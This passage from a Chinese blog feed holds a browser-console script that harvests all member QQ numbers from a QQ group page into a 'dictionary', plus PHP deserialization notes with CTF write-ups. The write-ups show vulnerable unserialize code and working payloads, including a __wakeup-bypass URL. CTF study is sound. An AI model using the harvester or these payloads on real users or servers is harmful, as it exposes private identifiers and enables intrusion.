      <url>/posts/17306.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/hint.css/2.7.0/hint.min.css"><meta name="referrer" content="no-referrer"><p>首先登录 <a href="https://qun.qq.com/member.html">qq 群网页版</a><br>在控制台中运行 js 脚本提取 qq 号码:</p><figure class="highlight javascript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> qq_sl = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">"groupMemberNum"</span>);</span><br><span class="line"><span class="keyword">var</span> qq_js = <span class="title class_">Math</span>.<span class="title function_">trunc</span>(qq_sl.<span class="property">innerHTML</span> / <span class="number">21</span>);</span><br><span class="line"><span class="keyword">var</span> qq_number = <span class="number">0</span>;</span><br><span class="line"><span class="variable language_">window</span>.<span class="title function_">scrollTo</span>(<span class="number">0</span>, <span class="variable language_">document</span>.<span class="property">body</span>.<span class="property">scrollHeight</span>);</span><br><span class="line"><span class="keyword">var</span> qq_ds = <span class="built_in">setInterval</span>(<span class="keyword">function</span> (<span class="params"></span>) {</span><br><span class="line">  <span class="variable language_">window</span>.<span class="title function_">scrollTo</span>(<span class="number">0</span>, <span class="variable language_">document</span>.<span class="property">body</span>.<span class="property">scrollHeight</span>);</span><br><span class="line">  qq_number++;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">"正在加载所有页面："</span> + qq_number + <span class="string">"/"</span> + qq_js);</span><br><span class="line">  <span class="keyword">if</span> (qq_js &lt;= qq_number) {</span><br><span class="line">    <span class="built_in">clearInterval</span>(qq_ds);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">"加载完毕，正在获取页面所有QQ号码..."</span>);</span><br><span class="line">    <span class="keyword">var</span> classan = <span class="variable language_">document</span>.<span class="title function_">getElementsByClassName</span>(<span class="string">"mb"</span>);</span><br><span class="line">    <span class="keyword">var</span> number = classan.<span class="property">length</span>;</span><br><span class="line">    <span class="keyword">for</span> (nr = <span class="number">0</span>; nr &lt; number; nr++) {</span><br><span class="line">      <span class="keyword">var</span> class_qq = classan[nr].<span class="title function_">getAttribute</span>(<span class="string">"class"</span>);</span><br><span class="line">      <span class="keyword">var</span> qq = qq + <span class="string">"\n"</span> + class_qq.<span class="title function_">substring</span>(<span class="number">5</span>);</span><br><span class="line">    }</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(qq);</span><br><span class="line">  }</span><br><span class="line">}, <span class="number">500</span>);</span><br></pre></td></tr></tbody></table></figure><p>生成字典，自行手动储存。</p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      
      
      <categories>
          
          <category> 随想随记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>php 反序列化</title>
      <link href="/posts/91123.html"/>
      <url>/posts/91123.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/hint.css/2.7.0/hint.min.css"><meta name="referrer" content="no-referrer"><h2 id="前言"><a class="markdownIt-Anchor" href="#前言"></a> 前言</h2><p>仅作留档。</p><h2 id="php反序列化"><a class="markdownIt-Anchor" href="#php反序列化"></a> php 反序列化</h2><p>定义：序列化就是将对象转换成字符串。反序列化相反，数据的格式的转换对象的序列化利于对象的保存和传输，也可以让多个文件共享对象。</p><p>漏洞原理：未对用户输入的序列化字符串进行检测，导致攻击者可以控制反序列化的过程，从而导致代码执行，SQL 注入，目录遍历等不可控后果。在反序列化的过程中自动触发了某些魔术方法。当进行反序列化的时候就有可能会触发对象中的一些魔术方法。</p><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">serialize</span>()<span class="comment">//将一个对象转换成要给字符串</span></span><br><span class="line"><span class="title function_ invoke__">unserialize</span>()<span class="comment">//将字符串还原成一个对象触发： unserialize函数的变量可控，文件中存在可利用的类，类中有魔术方法</span></span><br><span class="line"><span class="title function_ invoke__">__toString</span>()<span class="comment">//方法在将一个对象转化成字符串时自动调用，比如使用echo打印对象时</span></span><br><span class="line"><span class="title function_ invoke__">__construct</span>()<span class="comment">//创建对象时触发</span></span><br><span class="line"><span class="title function_ invoke__">__destruct</span>()<span class="comment">//对象被销毁时触发</span></span><br><span class="line"><span class="title function_ invoke__">__wakeup</span>()<span class="comment">//在使用unserialize()时，会检查是否存在一个__wakeup()魔术方法。如果存在，则该方法会先被调用，预先准备对象需要的资源。</span></span><br><span class="line"><span class="title function_ invoke__">__call</span>()<span class="comment">//在对象上下文中调用不可访问的方法时触发</span></span><br><span class="line"><span class="title function_ invoke__">__invoke</span>()<span class="comment">//在脚本尝试将对象调用为函数时触发</span></span><br><span class="line"><span class="title function_ invoke__">__callStatic</span>()<span class="comment">//在静态上下文中调用不可访问的方法时触发</span></span><br><span class="line"><span class="title function_ invoke__">__get</span>()<span class="comment">//用于从不可访问的属性读取数据</span></span><br><span class="line"><span class="title function_ invoke__">__set</span>()<span class="comment">//用于将数据写入不可访问的属性</span></span><br><span class="line"><span class="title function_ invoke__">__isset</span>() <span class="comment">//在不可访问的属性上调用isset()或empty()触发</span></span><br><span class="line"><span class="title function_ invoke__">__unset</span>()<span class="comment">//在不可访问的属性上使用unset()时触发</span></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202507221445041.png" alt="image-20220924112412517"></p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202507221446017.png" alt="image-20220928101409891"></p><h2 id="常用魔术方法"><a class="markdownIt-Anchor" href="#常用魔术方法"></a> 常用魔术方法</h2><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>、__get、__set</span><br><span class="line"></span><br><span class="line">这两个方法是为在类和他们的父类中没有声明的属性而设计的</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__get</span>( <span class="variable">$property</span> ) 当调用一个未定义的属性时访问此方法</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__set</span>( <span class="variable">$property</span>, <span class="variable">$value</span> ) 给一个未定义的属性赋值时调用</span><br><span class="line"></span><br><span class="line">这里的没有声明包括访问控制为proteced,<span class="keyword">private</span>的属性（即没有权限访问的属性）</span><br><span class="line"></span><br><span class="line"><span class="number">2</span>、__isset、__unset</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__isset</span>( <span class="variable">$property</span> ) 当在一个未定义的属性上调用<span class="keyword">isset</span>()函数时调用此方法</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__unset</span>( <span class="variable">$property</span> ) 当在一个未定义的属性上调用<span class="keyword">unset</span>()函数时调用此方法</span><br><span class="line"></span><br><span class="line">与__get方法和__set方法相同，这里的没有声明包括访问控制为proteced,<span class="keyword">private</span>的属性（即没有权限访问的属性）</span><br><span class="line"></span><br><span class="line"><span class="number">3</span>、__call</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__call</span>( <span class="variable">$method</span>, <span class="variable">$arg_array</span> ) 当调用一个未定义(包括没有权限访问)的方法是调用此方法</span><br><span class="line"></span><br><span class="line"><span class="number">4</span>、__autoload</span><br><span class="line"></span><br><span class="line">__autoload 函数，使用尚未被定义的类时自动调用。通过此函数，脚本引擎在 PHP 出错失败前有了最后一个机会加载所需的类。</span><br><span class="line"></span><br><span class="line">注意: 在 __autoload 函数中抛出的异常不能被 <span class="keyword">catch</span> 语句块捕获并导致致命错误。</span><br><span class="line"></span><br><span class="line"><span class="number">5</span>、__construct、__destruct</span><br><span class="line"></span><br><span class="line">__construct 构造方法，当一个对象被创建时调用此方法，好处是可以使构造方法有一个独一无二的名称，无论它所在的类的名称是什么，这样你在改变类的名称时，就不需要改变构造方法的名称</span><br><span class="line"></span><br><span class="line">__destruct 析构方法，PHP将在对象被销毁前（即从内存中清除前）调用这个方法</span><br><span class="line"></span><br><span class="line">默认情况下,PHP仅仅释放对象属性所占用的内存并销毁对象相关的资源.，析构函数允许你在使用一个对象之后执行任意代码来清除内存，当PHP决定你的脚本不再与对象相关时，析构函数将被调用.</span><br><span class="line"></span><br><span class="line">在一个函数的命名空间内，这会发生在函数<span class="keyword">return</span>的时候，对于全局变量，这发生于脚本结束的时候，如果你想明确地销毁一个对象，你可以给指向该对象的变量分配任何其它值，通常将变量赋值勤为<span class="literal">NULL</span>或者调用<span class="keyword">unset</span>。</span><br><span class="line"></span><br><span class="line"><span class="number">6</span>、__clone</span><br><span class="line"></span><br><span class="line">PHP5中的对象赋值是使用的引用赋值，使用<span class="keyword">clone</span>方法复制一个对象时，对象会自动调用__clone魔术方法，如果在对象复制需要执行某些初始化操作，可以在__clone方法实现。</span><br><span class="line"></span><br><span class="line"><span class="number">7</span>、__toString</span><br><span class="line"></span><br><span class="line">__toString方法在将一个对象转化成字符串时自动调用，比如使用<span class="keyword">echo</span>打印对象时，如果类没有实现此方法，则无法通过<span class="keyword">echo</span>打印对象，否则会显示：Catchable fatal error: Object of <span class="class"><span class="keyword">class</span> <span class="title">test</span> <span class="title">could</span> <span class="title">not</span> <span class="title">be</span> <span class="title">converted</span> <span class="title">to</span> <span class="title">string</span> <span class="title">in</span>，此方法必须返回一个字符串。</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">在<span class="title">PHP</span> 5.2.0之前，<span class="title">__toString</span>方法只有结合使用<span class="title">echo</span>() 或 <span class="title">print</span>()时 才能生效。<span class="title">PHP</span> 5.2.0之后，则可以在任何字符串环境生效（例如通过<span class="title">printf</span>()，使用%<span class="title">s</span>修饰符），但 不能用于非字符串环境（如使用%<span class="title">d</span>修饰符）</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">从<span class="title">PHP</span> 5.2.0，如果将一个未定义<span class="title">__toString</span>方法的对象 转换为字符串，会报出一个<span class="title">E_RECOVERABLE_ERROR</span>错误。</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">8、<span class="title">__sleep</span>、<span class="title">__wakeup</span></span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"><span class="title">__sleep</span> 串行化的时候用</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"><span class="title">__wakeup</span> 反串行化的时候调用</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"><span class="title">serialize</span>() 检查类中是否有魔术名称 <span class="title">__sleep</span> 的函数。如果这样，该函数将在任何序列化之前运行。它可以清除对象并应该返回一个包含有该对象中应被序列化的所有变量名的数组。</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">使用 <span class="title">__sleep</span> 的目的是关闭对象可能具有的任何数据库连接，提交等待中的数据或进行类似的清除任务。此外，如果有非常大的对象而并不需要完全储存下来时此函数也很有用。</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">相反地，<span class="title">unserialize</span>() 检查具有魔术名称 <span class="title">__wakeup</span> 的函数的存在。如果存在，此函数可以重建对象可能具有的任何资源。使用 <span class="title">__wakeup</span> 的目的是重建在序列化中可能丢失的任何数据库连接以及处理其它重新初始化的任务。</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">9、<span class="title">__set_state</span></span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">当调用<span class="title">var_export</span>()时，这个静态 方法会被调用（自<span class="title">PHP</span> 5.1.0起有效）。本方法的唯一参数是一个数组，其中包含按<span class="title">array</span>(’<span class="title">property</span>’ =&gt; <span class="title">value</span>, …)格式排列的类属性。</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">10、<span class="title">__invoke</span></span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">当尝试以调用函数的方式调用一个对象时，<span class="title">__invoke</span> 方法会被自动调用。<span class="title">PHP5</span>.3.0以上版本有效</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">11、<span class="title">__callStatic</span></span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">它的工作方式类似于 <span class="title">__call</span>() 魔术方法，<span class="title">__callStatic</span>() 是为了处理静态方法调用，<span class="title">PHP5</span>.3.0以上版本有效，<span class="title">PHP</span> 确实加强了对 <span class="title">__callStatic</span>() 方法的定义；它必须是公共的，并且必须被声明为静态的。</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">同样，<span class="title">__call</span>() 魔术方法必须被定义为公共的，所有其他魔术方法都必须如此。</span></span><br></pre></td></tr></tbody></table></figure><p>案例</p><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ABC</span></span>{</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$test</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>{</span><br><span class="line">        <span class="variable">$test</span> =<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'调用了构造函数&lt;br&gt;'</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>{</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'调用了析构函数&lt;br&gt;'</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>{</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'调用了苏醒函数&lt;br&gt;'</span>;</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'创建对象a&lt;br&gt;'</span>;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">ABC</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'序列化&lt;br&gt;'</span>;</span><br><span class="line"><span class="variable">$a_ser</span>=<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'反序列化&lt;br&gt;'</span>;</span><br><span class="line"><span class="variable">$a_unser</span>=<span class="title function_ invoke__">unserialize</span>(<span class="variable">$a_ser</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'对象快要死了！'</span>;</span><br><span class="line">     </span><br><span class="line"><span class="meta">?&gt;</span>    </span><br></pre></td></tr></tbody></table></figure><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202507221446663.png" alt="image-20221009162607187"></p><p>要记忆的东西很多，记不住的话建议向上面那样开三个窗口对着看，或者多屏</p><h3 id="swpuctf-2021-新生赛ez_unserialize"><a class="markdownIt-Anchor" href="#swpuctf-2021-新生赛ez_unserialize"></a> [SWPUCTF 2021 新生赛] ez_unserialize</h3><p>普通反序列化</p><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="string">"cl45s.php"</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">wllm</span></span>{</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$admin</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$passwd</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>{</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;admin =<span class="string">"user"</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;passwd = <span class="string">"123456"</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>{</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;admin === <span class="string">"admin"</span> &amp;&amp; <span class="variable language_">$this</span>-&gt;passwd === <span class="string">"ctf"</span>){</span><br><span class="line">            <span class="keyword">include</span>(<span class="string">"flag.php"</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        }<span class="keyword">else</span>{</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;admin;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;passwd;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"Just a bit more!"</span>;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="variable">$p</span> = <span class="variable">$_GET</span>[<span class="string">'p'</span>];</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$p</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure><p>解题</p><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">wllm</span></span>{</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$admin</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$passwd</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>{</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;admin =<span class="string">"admin"</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;passwd =<span class="string">"ctf"</span>;</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title function_ invoke__">wllm</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure><h3 id="swpuctf-2021-新生赛no_wakeup"><a class="markdownIt-Anchor" href="#swpuctf-2021-新生赛no_wakeup"></a> [SWPUCTF 2021 新生赛] no_wakeup</h3><p>绕过 wakeup 魔术方法</p><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">"Content-type:text/html;charset=utf-8"</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="string">"class.php"</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HaHaHa</span></span>{</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$admin</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$passwd</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>{</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;admin =<span class="string">"user"</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;passwd = <span class="string">"123456"</span>;</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>{</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;passwd = <span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span>-&gt;passwd);</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>{</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;admin === <span class="string">"admin"</span> &amp;&amp; <span class="variable language_">$this</span>-&gt;passwd === <span class="string">"wllm"</span>){</span><br><span class="line">                <span class="keyword">include</span>(<span class="string">"flag.php"</span>);</span><br><span class="line">                <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">            }<span class="keyword">else</span>{</span><br><span class="line">                <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;passwd;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"No wake up"</span>;</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line"><span class="variable">$Letmeseesee</span> = <span class="variable">$_GET</span>[<span class="string">'p'</span>];</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$Letmeseesee</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></tbody></table></figure><p>考点：__wakeup () 函数的绕过：当序列化字符串表示对象属性个数的值大于真实个数的属性时就会跳过 wakeup 的执行。因此，需要修改序列化字符串中的属性个数。</p><p>漏洞影响<em>的版本</em>： <em>PHP</em>5 &lt; 5.6.25 <em>PHP</em>7 &lt; 7.0.10</p><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HaHaHa</span></span>{</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$admin</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$passwd</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>{</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;admin = <span class="string">"admin"</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;passwd = <span class="string">"wllm"</span>;</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">    }</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title class_">HaHaHa</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure><p>输出如下：</p><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">6</span>:<span class="string">"HaHaHa"</span>:<span class="number">2</span>:{s:<span class="number">5</span>:<span class="string">"admin"</span>;s:<span class="number">5</span>:<span class="string">"admin"</span>;s:<span class="number">6</span>:<span class="string">"passwd"</span>;s:<span class="number">4</span>:<span class="string">"wllm"</span>;}</span><br><span class="line">payload：http:<span class="comment">//1.14.71.254:28886/class.php?p=O:6:%22HaHaHa%22:3:{s:5:%22admin%22;s:5:%22admin%22;s:6:%22passwd%22;s:4:%22wllm%22;}</span></span><br></pre></td></tr></tbody></table></figure><h3 id="执行__tostring魔术方法"><a class="markdownIt-Anchor" href="#执行__tostring魔术方法"></a> 执行__toString () 魔术方法</h3><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>{  <span class="comment">//flag.php  </span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span>{  </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;file)){  </span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;file); </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">        <span class="keyword">return</span> (<span class="string">"U R SO CLOSE !///COME ON PLZ"</span>);</span><br><span class="line">        }  </span><br><span class="line">    }  </span><br><span class="line">}  </span><br><span class="line"><span class="meta">?&gt;</span>  